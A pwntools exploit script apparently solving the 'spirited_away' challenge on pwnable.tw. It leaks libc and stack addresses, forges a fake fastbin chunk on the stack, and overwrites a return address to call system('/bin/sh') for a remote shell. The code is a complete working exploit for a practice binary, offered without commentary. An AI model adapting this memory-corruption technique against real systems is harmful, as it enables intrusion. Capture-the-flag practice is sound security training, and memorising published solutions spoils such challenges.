from pwn import *

local = False
elf = 'spirited_away' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10204
    r = remote(ip,port)

context.arch = 'i386'
l = ELF('./libc_32.so.6')

r.recvuntil('name: ')
r.send('a')
r.recvuntil('age: ')
r.sendline('30' )
r.recvuntil('movie? ')
r.send('b' * 56)
r.recvuntil('comment: ')
r.send('a' * 0x3c)

r.recvuntil('Reason: ' + 'b' * 56)
stack = u32(r.recv(4))
r.recv(4)
l.address = u32(r.recv(4)) - l.sym.fflush - 11
success("libc = %s" , hex(l.address) )
success("stack = %s" , hex(stack) )
r.recvuntil('>: ')
r.sendline('y' )

for i in range(9):
    r.recvuntil('name: ')
    r.send('a' )
    r.recvuntil('age: ')
    r.sendline('30' )
    r.recvuntil('movie? ')
    r.send('a' )
    r.recvuntil('comment: ')
    r.send('a' )
    r.recvuntil('>: ')
    r.sendline('y' )

for i in range(90):
    r.recvuntil('age: ')
    r.sendline('30' )
    r.recvuntil('movie? ')
    r.send('a' )
    r.recvuntil('>: ')
    r.sendline('y' )

# fake fast bin 0x40
r.recvuntil('name: ')
r.send('a' )
r.recvuntil('age: ')
r.sendline('30' )
r.recvuntil('movie? ')
r.send( p32(0xdeadbeef) + p32(0) + p32(0) + p32(0x41) + '\x00' * 0x38 + p32(0) + p32(0x41) )
r.recvuntil('comment: ')
r.send('c' * 0x50 + p32(0x1e) + p32(stack - 0x60) )
r.recvuntil('>: ')
r.sendline('y' )

r.recvuntil('name: ')
r.send( p32(0) * 15 + p32(0x41) + p32(0) + p32(l.sym.system) + p32(0) + p32(l.search('/bin/sh').next() ) )
r.recvuntil('age: ')
r.sendline('30' )
r.recvuntil('movie? ')
r.send('a')
r.recvuntil('comment: ')
r.send('a')
r.recvuntil('>: ')
raw_input('aaa')
r.sendline('n')
r.interactive()
